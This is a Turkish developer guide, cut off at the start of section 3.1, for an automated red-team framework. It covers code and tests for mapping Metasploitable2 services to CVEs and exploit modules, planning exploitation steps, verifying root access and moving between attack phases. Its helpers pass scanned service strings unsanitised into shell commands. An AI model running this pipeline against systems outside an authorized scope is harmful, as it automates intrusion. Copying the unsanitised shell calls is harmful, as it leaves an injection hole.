# AutoRedTeam — Uygulama Rehberi (v3.0)

> **Amaç:** Bu doküman, v3.0 mimarisini **kendin geliştirebilmen** için
> adım adım, kod örnekleriyle, her şeyin nasıl yapılacağını anlatır.
> **Ön koşul:** `MIMARI_ANALIZ_VE_TASARIM_V3.md` ve `GELISTIRME_PLANI_V3.md` okunmuş olmalı.
> **Yaklaşım:** Her modül için: (1) ne yapar, (2) neden gerekli, (3) tam kod,
> (4) nasıl test edilir, (5) nasıl entegre edilir.

---

## İçindekiler

1. [Genel Prensipler ve Kod Standartları](#1-genel-prensipler)
2. [Aşama 1: Deterministik Çekirdek](#2-asama-1-deterministik-cekirdek)
   - 2.1 `core/vuln_mapper.py`
   - 2.2 `core/exploit_planner.py`
   - 2.3 `core/verifier.py`
   - 2.4 `core/state_machine.py`
3. [Aşama 2: İstismar Derinliği](#3-asama-2-istismar-derinligi)
   - 3.1 `core/credential_engine.py`
   - 3.2 `core/web_exploit_engine.py`
   - 3.3 `core/post_exploit.py`
4. [Aşama 3: LLM Danışman Entegrasyonu](#4-asama-3-llm-danisman)
5. [Aşama 4: Rapor & Korelasyon](#5-asama-4-rapor-korelasyon)
6. [Aşama 5: Gerçek Dünya](#6-asama-5-gercek-dunya)
7. [Exploit Payload Düzeltmeleri](#7-exploit-payload-duzeltmeleri)
8. [Test Stratejisi](#8-test-stratejisi)
9. [Entegrasyon ve Geçiş Planı](#9-entegrasyon)

---

## 1. Genel Prensipler

### 1.1 Kod Standartları (Mevcut Projeye Uyum)

Mevcut kod tabanını inceledim. Şu standartlara uy:

```python
"""
AutoRedTeam - <Modul Adi> (<Kisa Aciklama>).

<Detayli aciklama: ne yapar, neden gerekli, nasil calisir>
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from core.scope import is_target_allowed, _log_audit

logger = logging.getLogger(__name__)


# ── Veri Modelleri ──────────────────────────────────────────────────────────

@dataclass
class MyModel:
    """Kisa aciklama."""
    field1: str
    field2: Optional[int] = None

    def to_dict(self) -> Dict[str, Any]:
        return {"field1": self.field1, "field2": self.field2}


# ── Ana Sinif ───────────────────────────────────────────────────────────────

class MyEngine:
    def __init__(self, ...):
        ...


# Modul seviyesinde tekil ornek (mevcut projede boyle)
my_engine = MyEngine()
```

**Kurallar:**
- Türkçe yorumlar (mevcut projede böyle), İngilizce kod tanımlayıcıları
- `@dataclass` ile veri modelleri
- `to_dict()` her modelde (JSON serileştirme için)
- `logger = logging.getLogger(__name__)`
- Modül seviyesinde tekil örnek (`recon_engine = ReconEngine()` gibi)
- Kapsam kontrolü: `from core.scope import is_target_allowed`
- Denetim logu: `_log_audit({...})`

### 1.2 Kapsam ve Güvenlik (ZORUNLU)

Her yeni modül, hedefe dokunmadan önce kapsam kontrolü yapmalı:

```python
from core.scope import is_target_allowed, _log_audit

def _reject_out_of_scope(target: str, action: str) -> Dict[str, Any]:
    _log_audit({
        "event": "REJECTED_OUT_OF_SCOPE",
        "tool": action,
        "target": target,
        "timestamp": datetime.now().isoformat(),
    })
    return {
        "status": "REJECTED_OUT_OF_SCOPE",
        "success": False,
        "message": f"Target '{target}' is not in the allow-list.",
    }
```

### 1.3 Docker Araç Çağırma (Mevcut Pattern)

Araçlar `assessment-tools` konteynerinde çalışır. Mevcut pattern:

```python
from core.scope import run_command  # veya assessment_tools._run_command

# Konteyner içinde çalıştır
output = run_command(f"nmap -sV {target}", timeout=120)
```

`core/scope.py:131` `run_command` fonksiyonunu incele — Docker exec yapar.

### 1.4 Geliştirme Sırası (Önemli)

**Bu sırayı takip et** — her adım bir öncekine bağımlı:

```
1. vuln_mapper.py      (servis -> CVE)
2. exploit_planner.py  (CVE -> plan)      <- vuln_mapper'a bağımlı
3. verifier.py         (kanıt doğrula)    <- bağımsız
4. state_machine.py    (faz geçişi)       <- bağımsız
5. credential_engine.py
6. web_exploit_engine.py
7. post_exploit.py
8. finding_correlator.py
9. cvss_scorer.py
10. LLM entegrasyonu (en son)
```

Her modülü yazdıktan sonra **hemen test et**, sonra sonrakine geç.

---

## 2. Aşama 1: Deterministik Çekirdek

> **Hedef:** LLM olmadan çalışan istismar motoru.
> **Süre:** ~2 hafta
> **Çıktı:** recon → mapping → exploit → verify zinciri LLM'siz çalışır.

### 2.1 `core/vuln_mapper.py` — Zafiyet Eşleyici

#### Ne yapar?
Servis + versiyon bilgisini alır, CVE'lerle eşler, istismar edilebilirlik
skoru hesaplar ve hangi exploit modülünün kullanılacağını belirler.

#### Neden gerekli?
Şu an `searchsploit` çıktısı ham metin olarak kalıyor; yapılandırılmış
"bu servis şu CVE'lere sahip, şu exploit ile istismar edilir" bilgisi yok.
Bu yüzden planner ne yapacağını bilemiyor.

#### Tam Kod

```python
"""
AutoRedTeam - Vulnerability Mapper (Servis -> CVE -> Exploit Eslemesi).

Recon katmanindan gelen servis/versiyon bilgisini alir; searchsploit, NVD
ve yerel bilgi tabani ile eslestirir; her zafiyet icin istismar edilebilirlik
skoru hesaplar ve kullanilacak exploit modulunu belirler.

Bu modul LLM'siz calisir (deterministik). Cikti, ExploitPlanner'a girdi olur.
"""

from __future__ import annotations

import json
import logging
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from core.scope import run_command

logger = logging.getLogger(__name__)

# Yerel CVE -> exploit haritasi (knowledge_base/ altinda)
KB_DIR = Path(__file__).resolve().parent.parent / "knowledge_base"
CVE_EXPLOIT_MAP_FILE = KB_DIR / "cve_exploit_map.json"


# ── Veri Modelleri ──────────────────────────────────────────────────────────

@dataclass
class Vulnerability:
    """Tek bir zafiyet kaydi."""
    service: str
    version: str
    port: int
    cves: List[str] = field(default_factory=list)
    exploit_module: Optional[str] = None
    exploitability: float = 0.0  # 0.0 - 1.0
    status: str = "pending"  # pending | attempted | exploited | not_vulnerable
    evidence: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "service": self.service,
            "version": self.version,
            "port": self.port,
            "cves": self.cves,
            "exploit_module": self.exploit_module,
            "exploitability": self.exploitability,
            "status": self.status,
            "evidence": self.evidence,
        }


# ── Yerel Bilgi Tabani ──────────────────────────────────────────────────────

# Metasploitable2 icin bilinen servis -> exploit eslemesi.
# Bu, "ezber" DEGIL; hizli baslangic noktasi. Bilinmeyen servisler icin
# searchsploit/NVD dinamik olarak kullanilir.
KNOWN_SERVICE_EXPLOITS: Dict[str, Dict[str, Any]] = {
    "vsftpd": {
        "versions": ["2.3.4"],
        "cves": ["CVE-2011-2523"],
        "exploit_module": "vsftpd_backdoor",
        "base_score": 0.95,
    },
    "samba": {
        "versions": ["3.0.20"],
        "cves": ["CVE-2007-2447"],
        "exploit_module": "samba_usermap",
        "base_score": 0.90,
    },
    "distccd": {
        "versions": ["1"],
        "cves": ["CVE-2004-2687"],
        "exploit_module": "distcc_exec",
        "base_score": 0.85,
    },
    "unrealircd": {
        "versions": ["3.2.8.1"],
        "cves": ["CVE-2010-2075"],
        "exploit_module": "unrealircd_backdoor",
        "base_score": 0.90,
    },
    "proftpd": {
        "versions": ["1.3.1"],
        "cves": ["CVE-2015-3306"],
        "exploit_module": "proftpd_modcopy",
        "base_score": 0.60,
    },
    "mysql": {
        "versions": ["5.0.51a"],
        "cves": ["CVE-2012-2122"],
        "exploit_module": None,  # credential_engine ile denenir
        "base_score": 0.80,
    },
    "postgresql": {
        "versions": ["8.3"],
        "cves": [],
        "exploit_module": None,
        "base_score": 0.50,
    },
    "tomcat": {
        "versions": [],
        "cves": [],
        "exploit_module": "tomcat_manager_deploy",
        "base_score": 0.70,
    },
    "drb": {
        "versions": [],
        "cves": [],
        "exploit_module": "ruby_drb_rce",
        "base_score": 0.65,
    },
    "java-rmi": {
        "versions": [],
        "cves": [],
        "exploit_module": "java_rmi_deserialize",
        "base_score": 0.55,
    },
    "vnc": {
        "versions": [],
        "cves": [],
        "exploit_module": "vnc_null_auth",
        "base_score": 0.60,
    },
    "ssh": {
        "versions": [],
        "cves": [],
        "exploit_module": None,  # credential_engine
        "base_score": 0.70,
    },
    "telnet": {
        "versions": [],
        "cves": [],
        "exploit_module": None,  # credential_engine
        "base_score": 0.65,
    },
}


# ── Ana Sinif ───────────────────────────────────────────────────────────────

class VulnerabilityMapper:
    """
    Servis/versiyon -> CVE -> exploit eslemesi yapar ve skorlar.
    """

    def __init__(self, kb_file: Optional[Path] = None):
        self.kb_file = kb_file or CVE_EXPLOIT_MAP_FILE
        self._local_kb = self._load_local_kb()

    def _load_local_kb(self) -> Dict[str, Any]:
        """Yerel CVE->exploit haritasini yukler (varsa)."""
        if self.kb_file.exists():
            try:
                with open(self.kb_file, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception as e:
                logger.warning(f"[VulnMapper] KB yuklenemedi: {e}")
        return {}

    def map_service(
        self,
        service: str,
        version: str = "",
        port: int = 0,
    ) -> List[Vulnerability]:
        """
        Bir servisi CVE'lerle esler ve Vulnerability listesi dondurur.
        """
        service_lower = service.lower().strip()
        vulns: List[Vulnerability] = []

        # 1. Yerel bilgi tabanindan bak
        known = KNOWN_SERVICE_EXPLOITS.get(service_lower)
        if known:
            vuln = Vulnerability(
                service=service,
                version=version,
                port=port,
                cves=list(known.get("cves", [])),
                exploit_module=known.get("exploit_module"),
                exploitability=known.get("base_score", 0.5),
            )
            vulns.append(vuln)

        # 2. searchsploit ile dinamik arama (bilinmeyen veya ek CVE'ler icin)
        dynamic = self._searchsploit(service, version)
        for d in dynamic:
            # Ayni CVE zaten varsa ekleme
            if not any(d["cve"] in v.cves for v in vulns):
                vulns.append(Vulnerability(
                    service=service,
                    version=version,
                    port=port,
                    cves=[d["cve"]] if d["cve"] else [],
                    exploit_module=None,
                    exploitability=0.4,
                    evidence=d.get("title", ""),
                ))

        # 3. Skorlari hesapla
        for v in vulns:
            v.exploitability = self.score_exploitability(v)

        return vulns

    def _searchsploit(self, service: str, version: str) -> List[Dict[str, Any]]:
        """searchsploit ile dinamik arama yapar (JSON cikti)."""
        query = f"{service} {version}".strip()
        if not query:
            return []
        try:
            # searchsploit --json <query>
            output = run_command(f"searchsploit --json {query}", timeout=60)
            data = json.loads(output)
            results = []
            for item in data.get("RESULTS_EXPLOIT", []):
                title = item.get("Title", "")
                # CVE'yi basliktan cikar
                cve_match = re.search(r"CVE-\d{4}-\d+", title)
                results.append({
                    "title": title,
                    "cve": cve_match.group(0) if cve_match else None,
                    "path": item.get("Path", ""),
                })
            return results
        except Exception as e:
            logger.debug(f"[VulnMapper] searchsploit hatasi: {e}")
            return []

    def score_exploitability(self, vuln: Vulnerability) -> float:
        """
        Istismar edilebilirlik skoru hesaplar (0.0 - 1.0).

        Faktorler:
          - Exploit modulu var mi? (+0.4)
          - CVE var mi? (+0.3)
          - Bilinen servis mi? (+0.2)
          - Versiyon eslesiyor mu? (+0.1)
        """
        score = 0.0
        if vuln.exploit_module:
            score += 0.4
        if vuln.cves:
            score += 0.3
        if vuln.service.lower() in KNOWN_SERVICE_EXPLOITS:
            score += 0.2
        # Versiyon eslesmesi
        known = KNOWN_SERVICE_EXPLOITS.get(vuln.service.lower(), {})
        if vuln.version and any(v in vuln.version for v in known.get("versions", [])):
            score += 0.1
        return min(1.0, score)

    def map_all(self, services: List[Any]) -> List[Vulnerability]:
        """
        Recon sonucundaki tum servisleri esler.

        Args:
            services: ServiceInfo listesi (recon_engine'den) veya dict listesi.
        """
        all_vulns: List[Vulnerability] = []
        for svc in services:
            # ServiceInfo dataclass veya dict olabilir
            if hasattr(svc, "service"):
                name, ver, port = svc.service, svc.version, svc.port
            else:
                name = svc.get("service", "")
                ver = svc.get("version", "")
                port = svc.get("port", 0)
            all_vulns.extend(self.map_service(name, ver, port))
        return all_vulns


# Modul seviyesinde tekil ornek
vuln_mapper = VulnerabilityMapper()
```

#### Nasıl Test Edilir?

`tests/test_vuln_mapper.py`:

```python
"""VulnerabilityMapper unit testleri."""
from core.vuln_mapper import VulnerabilityMapper, Vulnerability


def test_map_known_service():
    mapper = VulnerabilityMapper()
    vulns = mapper.map_service("vsftpd", "2.3.4", 21)
    assert len(vulns) >= 1
    assert vulns[0].exploit_module == "vsftpd_backdoor"
    assert "CVE-2011-2523" in vulns[0].cves


def test_score_high_for_known_exploit():
    mapper = VulnerabilityMapper()
    vuln = Vulnerability(
        service="vsftpd", version="2.3.4", port=21,
        cves=["CVE-2011-2523"], exploit_module="vsftpd_backdoor",
    )
    score = mapper.score_exploitability(vuln)
    assert score >= 0.9


def test_score_low_for_unknown():
    mapper = VulnerabilityMapper()
    vuln = Vulnerability(service="unknown-svc", version="", port=9999)
    score = mapper.score_exploitability(vuln)
    assert score <= 0.3


def test_map_all_from_dicts():
    mapper = VulnerabilityMapper()
    services = [
        {"service": "vsftpd", "version": "2.3.4", "port": 21},
        {"service": "ssh", "version": "OpenSSH 4.7", "port": 22},
    ]
    vulns = mapper.map_all(services)
    assert len(vulns) >= 2
```

Çalıştır: `python -m pytest tests/test_vuln_mapper.py -v`

---

### 2.2 `core/exploit_planner.py` — İstismar Planlayıcı

#### Ne yapar?
Zafiyet listesini alır, öncelik sırasına göre bir **istismar planı** oluşturur.
Sıradaki adımı verir, sonucu kaydeder, başarısız olunca alternatif üretir.

#### Neden gerekli?
**Bu, sistemin beyni.** Şu an "sıradaki adım ne?" sorusunu LLM'e soruyoruz;
bu yüzden takılıyor. Bu modül o soruyu deterministik olarak cevaplar.

#### Tam Kod

```python
"""
AutoRedTeam - Exploit Planner (Deterministik Istismar Planlayici).

VulnerabilityMapper'dan gelen zafiyet listesini alir; oncelik sirasina gore
bir istismar plani olusturur. Siradaki adimi verir, sonucu kaydeder ve
basarisiz adimlar icin alternatif uretir.

KRITIK: Bu modul LLM'siz calisir. "Siradaki adim ne?" sorusunu deterministik
olarak cevaplar. LLM yalnizca ozel payload gerektiginde devreye girer.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional

from core.vuln_mapper import Vulnerability

logger = logging.getLogger(__name__)


class StepStatus(str, Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    SKIPPED = "skipped"


@dataclass
class ExploitStep:
    """Tek bir istismar adimi."""
    step_id: int
    target: str
    port: int
    service: str
    exploit_module: Optional[str]
    priority: float
    status: StepStatus = StepStatus.PENDING
    attempts: int = 0
    max_attempts: int = 2
    evidence: Optional[Dict[str, Any]] = None
    alternatives: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "step_id": self.step_id,
            "target": self.target,
            "port": self.port,
            "service": self.service,
            "exploit_module": self.exploit_module,
            "priority": self.priority,
            "status": self.status.value,
            "attempts": self.attempts,
            "evidence": self.evidence,
        }


# Basarisizlik durumunda denenecek alternatif teknikler (servis bazli)
ALTERNATIVES: Dict[str, List[str]] = {
    "vsftpd": ["credential_spray", "ftp_anonymous"],
    "samba": ["smb_null_session", "credential_spray"],
    "distcc": ["credential_spray"],
    "unrealircd": ["credential_spray"],
    "ssh": ["credential_spray", "ssh_key_check"],
    "mysql": ["credential_spray", "mysql_udf"],
    "tomcat": ["credential_spray", "tomcat_war_manual"],
    "drb": ["credential_spray"],
    "java-rmi": ["rmi_registry_list"],
    "vnc": ["vnc_weak_auth"],
}


class ExploitPlanner:
    """
    Zafiyetleri oncelikli istismar planina donusturur ve yonetir.
    """

    def __init__(self, target: str):
        self.target = target
        self.plan: List[ExploitStep] = []
        self._next_id = 1

    def build_plan(self, vulns: List[Vulnerability]) -> List[ExploitStep]:
        """
        Zafiyetleri oncelik sirasina gore istismar planina donusturur.

        Oncelik = exploitability (yuksek olan once).
        Exploit modulu olmayanlar (credential gerektirenler) sona.
        """
        steps: List[ExploitStep] = []
        for v in vulns:
            # Exploit modulu olmayan ve CVE'si olmayan servisleri atla
            # (bunlar credential_engine ile ayrica ele alinir)
            if not v.exploit_module and not v.cves:
                continue
            step = ExploitStep(
                step_id=self._next_id,
                target=self.target,
                port=v.port,
                service=v.service,
                exploit_module=v.exploit_module,
                priority=v.exploitability,
                alternatives=ALTERNATIVES.get(v.service.lower(), []),
            )
            self._next_id += 1
            steps.append(step)

        # Oncelik sirasina gore sirala (yuksek once)
        steps.sort(key=lambda s: s.priority, reverse=True)
        self.plan = steps
        logger.info(f"[Planner] {len(steps)} adimli plan olusturuldu.")
        return steps

    def next_step(self) -> Optional[ExploitStep]:
        """Siradaki denenmemis adimi dondurur."""
        for step in self.plan:
            if step.status == StepStatus.PENDING:
                return step
        return None

    def mark_result(
        self,
        step: ExploitStep,
        success: bool,
        evidence: Optional[Dict[str, Any]] = None,
    ) -> None:
        """Adim sonucunu kaydeder."""
        step.attempts += 1
        if success:
            step.status = StepStatus.SUCCESS
            step.evidence = evidence
            logger.info(f"[Planner] Adim {step.step_id} BASARILI: {step.exploit_module}")
        else:
            if step.attempts >= step.max_attempts:
                step.status = StepStatus.FAILED
                logger.info(f"[Planner] Adim {step.step_id} BASARISIZ (max deneme).")
            else:
                step.status = StepStatus.PENDING  # tekrar dene
            step.evidence = evidence

    def try_alternative(self, step: ExploitStep) -> Optional[ExploitStep]:
        """
        Basarisiz adim icin alternatif bir adim uretir.
        Alternatif yoksa None doner.
        """
        if not step.alternatives:
            return None
        alt = step.alternatives.pop(0)
        new_step = ExploitStep(
            step_id=self._next_id,
            target=step.target,
            port=step.port,
            service=step.service,
            exploit_module=alt,
            priority=step.priority * 0.8,  # biraz daha dusuk oncelik
        )
        self._next_id += 1
        self.plan.append(new_step)
        logger.info(f"[Planner] Alternatif eklendi: {alt} (adim {new_step.step_id})")
        return new_step

    def is_complete(self) -> bool:
        """Tum adimlar denendi mi?"""
        return all(
            s.status in (StepStatus.SUCCESS, StepStatus.FAILED, StepStatus.SKIPPED)
            for s in self.plan
        )

    def progress(self) -> Dict[str, int]:
        """Plan ilerlemesini ozetler."""
        counts = {s.value: 0 for s in StepStatus}
        for step in self.plan:
            counts[step.status.value] += 1
        counts["total"] = len(self.plan)
        return counts

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "plan": [s.to_dict() for s in self.plan],
            "progress": self.progress(),
        }
```

#### Nasıl Test Edilir?

`tests/test_exploit_planner.py`:

```python
"""ExploitPlanner unit testleri."""
from core.exploit_planner import ExploitPlanner, StepStatus
from core.vuln_mapper import Vulnerability


def _make_vulns():
    return [
        Vulnerability(service="vsftpd", version="2.3.4", port=21,
                      cves=["CVE-2011-2523"], exploit_module="vsftpd_backdoor",
                      exploitability=0.95),
        Vulnerability(service="distccd", version="1", port=3632,
                      cves=["CVE-2004-2687"], exploit_module="distcc_exec",
                      exploitability=0.85),
    ]


def test_build_plan_sorted_by_priority():
    planner = ExploitPlanner("metasploitable2")
    plan = planner.build_plan(_make_vulns())
    assert len(plan) == 2
    assert plan[0].exploit_module == "vsftpd_backdoor"  # en yuksek oncelik


def test_next_step_returns_pending():
    planner = ExploitPlanner("metasploitable2")
    planner.build_plan(_make_vulns())
    step = planner.next_step()
    assert step is not None
    assert step.status == StepStatus.PENDING


def test_mark_success():
    planner = ExploitPlanner("metasploitable2")
    planner.build_plan(_make_vulns())
    step = planner.next_step()
    planner.mark_result(step, success=True, evidence={"uid": "0"})
    assert step.status == StepStatus.SUCCESS


def test_mark_failure_then_alternative():
    planner = ExploitPlanner("metasploitable2")
    planner.build_plan(_make_vulns())
    step = planner.next_step()
    planner.mark_result(step, success=False)
    planner.mark_result(step, success=False)  # max_attempts=2
    assert step.status == StepStatus.FAILED
    alt = planner.try_alternative(step)
    assert alt is not None


def test_is_complete():
    planner = ExploitPlanner("metasploitable2")
    planner.build_plan(_make_vulns())
    assert not planner.is_complete()
    for step in planner.plan:
        planner.mark_result(step, success=True)
    assert planner.is_complete()
```

---

### 2.3 `core/verifier.py` — Kanıt Doğrulayıcı

#### Ne yapar?
Exploit sonucunu alır, gerçekten başarılı olup olmadığını **kanıtla** doğrular.
`uid=0`, dosya içeriği, DB dump gibi somut kanıt arar.

#### Neden gerekli?
Şu an "success" bayrağına güveniliyor ama kanıt yapılandırılmamış. Bu yüzden
yanlış pozitifler ve bulgu tekrarı oluşuyor.

#### Tam Kod

```python
"""
AutoRedTeam - Verifier (Kanit Dogrulayici).

Exploit/privesc sonuclarini alir; gercekten basarili olup olmadigini somut
kanitla dogrular (uid=0, dosya icerigi, DB dump, banner). Yanlis pozitifleri
filtreler ve her bulguya guven skoru atar.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, Optional

logger = logging.getLogger(__name__)


@dataclass
class Evidence:
    """Yapilandirilmis kanit."""
    command: str = ""
    output: str = ""
    verified: bool = False
    verification_method: str = ""  # uid_check | file_content | db_dump | banner | none
    confidence: float = 0.0  # 0.0 - 1.0
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "command": self.command,
            "output": self.output[:2000],
            "verified": self.verified,
            "verification_method": self.verification_method,
            "confidence": self.confidence,
            "details": self.details,
        }


# Dogrulama desenleri
UID_ROOT_PATTERN = re.compile(r"uid=0\(root\)")
UID_ANY_PATTERN = re.compile(r"uid=\d+\((\w+)\)")
SHELL_PROMPT_PATTERN = re.compile(r"root@[\w.-]+[:#]")
DB_DUMP_PATTERN = re.compile(r"(Database|information_schema|mysql)", re.IGNORECASE)


class Verifier:
    """
    Exploit sonuclarini kanitla dogrular.
    """

    def verify_exploit(
        self,
        result: Dict[str, Any],
        expected: Optional[str] = None,
    ) -> Evidence:
        """
        Exploit sonucunu dogrular.

        Args:
            result: exploit_runner ciktisi (success, output, evidence icerir)
            expected: beklenen kanit tipi (uid_check, file_content vb.)
        """
        output = str(result.get("output", ""))
        command = str(result.get("command", ""))
        evidence = Evidence(command=command, output=output)

        # 1. uid=0(root) kontrolu (en guclu kanit)
        if UID_ROOT_PATTERN.search(output):
            evidence.verified = True
            evidence.verification_method = "uid_check"
            evidence.confidence = 1.0
            evidence.details["privilege"] = "root"
            return evidence

        # 2. Herhangi bir uid (kullanici seviyesi erisim)
        uid_match = UID_ANY_PATTERN.search(output)
        if uid_match:
            evidence.verified = True
            evidence.verification_method = "uid_check"
            evidence.confidence = 0.8
            evidence.details["privilege"] = uid_match.group(1)
            return evidence

        # 3. Shell promptu
        if SHELL_PROMPT_PATTERN.search(output):
            evidence.verified = True
            evidence.verification_method = "shell_prompt"
            evidence.confidence = 0.7
            return evidence

        # 4. DB dump
        if DB_DUMP_PATTERN.search(output):
            evidence.verified = True
            evidence.verification_method = "db_dump"
            evidence.confidence = 0.75
            return evidence

        # 5. Sonuc success bayragina guven (dusuk guven)
        if result.get("success"):
            evidence.verified = True
            evidence.verification_method = "flag"
            evidence.confidence = 0.5
            return evidence

        # Dogrulanamadi
        evidence.verified = False
        evidence.verification_method = "none"
        evidence.confidence = 0.0
        return evidence

    def verify_finding(self, finding: Dict[str, Any]) -> Evidence:
        """Bir bulgunun gercekten zafiyet oldugunu dogrular."""
        evidence_text = str(finding.get("evidence_snippet", ""))
        category = str(finding.get("category", ""))
        ev = Evidence(output=evidence_text)

        # Versiyon tespiti -> dusuk guven (gercek istismar degil)
        if "version" in category.lower() or "software" in category.lower():
            ev.verified = True
            ev.verification_method = "banner"
            ev.confidence = 0.3
            return ev

        # Exploit/privesc -> yuksek guven
        if finding.get("tool") in ("exploit", "privesc"):
            if UID_ROOT_PATTERN.search(evidence_text):
                ev.verified = True
                ev.verification_method = "uid_check"
                ev.confidence = 1.0
                return ev

        ev.verified = bool(evidence_text)
        ev.verification_method = "text"
        ev.confidence = 0.4
        return ev

    def is_false_positive(self, evidence: Evidence) -> bool:
        """Yanlis pozitif tespiti."""
        return not evidence.verified or evidence.confidence < 0.3


# Modul seviyesinde tekil ornek
verifier = Verifier()
```

#### Nasıl Test Edilir?

`tests/test_verifier.py`:

```python
"""Verifier unit testleri."""
from core.verifier import Verifier, Evidence


def test_verify_root_uid():
    v = Verifier()
    ev = v.verify_exploit({"output": "uid=0(root) gid=0(root)", "success": True})
    assert ev.verified
    assert ev.verification_method == "uid_check"
    assert ev.confidence == 1.0
    assert ev.details["privilege"] == "root"


def test_verify_user_uid():
    v = Verifier()
    ev = v.verify_exploit({"output": "uid=1000(msfadmin)", "success": True})
    assert ev.verified
    assert ev.confidence == 0.8
    assert ev.details["privilege"] == "msfadmin"


def test_verify_failure():
    v = Verifier()
    ev = v.verify_exploit({"output": "connection refused", "success": False})
    assert not ev.verified
    assert ev.confidence == 0.0


def test_false_positive_detection():
    v = Verifier()
    ev = Evidence(verified=True, confidence=0.2)
    assert v.is_false_positive(ev)


def test_verify_finding_version_low_confidence():
    v = Verifier()
    ev = v.verify_finding({
        "category": "Old Software Version",
        "evidence_snippet": "Apache 2.2.8",
        "tool": "nmap",
    })
    assert ev.confidence <= 0.3
```

---

### 2.4 `core/state_machine.py` — Pentest Faz Makinesi

#### Ne yapar?
Pentest fazları (recon → mapping → exploitation → foothold → privesc →
lateral → reporting) arasındaki geçişleri yönetir.

#### Neden gerekli?
Şu an faz kavramı yok; LLM her adımda sıfırdan karar veriyor. Bu yüzden
foothold alındıktan sonra post-exploitation'a geçilmiyor, privesc tekrar ediyor.

#### Tam Kod

```python
"""
AutoRedTeam - Assessment State Machine (Pentest Faz Makinesi).

Pentest fazlari arasindaki gecisleri yonetir. Her fazin tamamlanma kosullarini
kontrol eder ve bir sonraki faza gecisi tetikler. Boylece sistem "foothold
alindi -> privesc'e gec" gibi mantikli kararlar verebilir.
"""

from __future__ import annotations

import logging
from enum import Enum
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class Phase(str, Enum):
    RECON = "recon"
    VULN_MAPPING = "vuln_mapping"
    EXPLOITATION = "exploitation"
    FOOTHOLD = "foothold"
    PRIVESC = "privesc"
    LATERAL = "lateral"
    REPORTING = "reporting"
    COMPLETE = "complete"


# Faz gecis kurallari: hangi fazdan hangi faza gecilebilir
TRANSITIONS: Dict[Phase, List[Phase]] = {
    Phase.RECON: [Phase.VULN_MAPPING],
    Phase.VULN_MAPPING: [Phase.EXPLOITATION],
    Phase.EXPLOITATION: [Phase.FOOTHOLD, Phase.PRIVESC, Phase.REPORTING],
    Phase.FOOTHOLD: [Phase.PRIVESC, Phase.LATERAL, Phase.REPORTING],
    Phase.PRIVESC: [Phase.LATERAL, Phase.REPORTING],
    Phase.LATERAL: [Phase.REPORTING],
    Phase.REPORTING: [Phase.COMPLETE],
    Phase.COMPLETE: [],
}


class AssessmentStateMachine:
    """
    Pentest fazlarini yonetir.
    """

    def __init__(self):
        self.phase = Phase.RECON
        self.history: List[Phase] = [Phase.RECON]
        self.foothold_obtained = False
        self.root_obtained = False

    def current_phase(self) -> Phase:
        return self.phase

    def can_transition(self, to_phase: Phase) -> bool:
        """Gecis kuralina uygun mu?"""
        return to_phase in TRANSITIONS.get(self.phase, [])

    def transition(self, to_phase: Phase) -> bool:
        """
        Faz gecisi yapar. Basariliysa True doner.
        """
        if not self.can_transition(to_phase):
            logger.warning(
                f"[StateMachine] Gecersiz gecis: {self.phase.value} -> {to_phase.value}"
            )
            return False
        self.phase = to_phase
        self.history.append(to_phase)
        logger.info(f"[StateMachine] Faz gecisi: {to_phase.value}")
        return True

    def on_foothold(self) -> None:
        """Foothold alindiginda cagrilir."""
        self.foothold_obtained = True
        if self.phase == Phase.EXPLOITATION:
            self.transition(Phase.FOOTHOLD)

    def on_root(self) -> None:
        """Root alindiginda cagrilir."""
        self.root_obtained = True
        if self.phase in (Phase.EXPLOITATION, Phase.FOOTHOLD):
            self.transition(Phase.PRIVESC)

    def next_phase(self) -> Optional[Phase]:
        """
        Mevcut duruma gore mantikli sonraki fazi onerir.
        """
        if self.phase == Phase.RECON:
            return Phase.VULN_MAPPING
        if self.phase == Phase.VULN_MAPPING:
            return Phase.EXPLOITATION
        if self.phase == Phase.EXPLOITATION:
            return Phase.FOOTHOLD if self.foothold_obtained else None
        if self.phase == Phase.FOOTHOLD:
            return Phase.PRIVESC if not self.root_obtained else Phase.LATERAL
        if self.phase == Phase.PRIVESC:
            return Phase.LATERAL
        if self.phase == Phase.LATERAL:
            return Phase.REPORTING
        if self.phase == Phase.REPORTING:
            return Phase.COMPLETE
        return None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "current_phase": self.phase.value,
            "history": [p.value for p in self.history],
            "foothold_obtained": self.foothold_obtained,
            "root_obtained": self.root_obtained,
        }
```

#### Nasıl Test Edilir?

`tests/test_state_machine.py`:

```python
"""AssessmentStateMachine unit testleri."""
from core.state_machine import AssessmentStateMachine, Phase


def test_initial_phase():
    sm = AssessmentStateMachine()
    assert sm.current_phase() == Phase.RECON


def test_valid_transition():
    sm = AssessmentStateMachine()
    assert sm.transition(Phase.VULN_MAPPING)
    assert sm.current_phase() == Phase.VULN_MAPPING


def test_invalid_transition():
    sm = AssessmentStateMachine()
    assert not sm.transition(Phase.PRIVESC)  # RECON'dan privesc'e gecilemez


def test_foothold_transition():
    sm = AssessmentStateMachine()
    sm.transition(Phase.VULN_MAPPING)
    sm.transition(Phase.EXPLOITATION)
    sm.on_foothold()
    assert sm.current_phase() == Phase.FOOTHOLD
    assert sm.foothold_obtained


def test_root_transition():
    sm = AssessmentStateMachine()
    sm.transition(Phase.VULN_MAPPING)
    sm.transition(Phase.EXPLOITATION)
    sm.on_foothold()
    sm.on_root()
    assert sm.current_phase() == Phase.PRIVESC
    assert sm.root_obtained
```

---

## 3. Aşama 2: İstismar Derinliği

> **Hedef:** Web + credential + post-exploit.
> **Süre:** ~2 hafta
> **Çıktı:** Metasploitable2'nin %80'i istismar edilir.

### 3.1 `core/credential_engine.py` — Kimlik Bilgisi Motoru

#### Ne yapar?
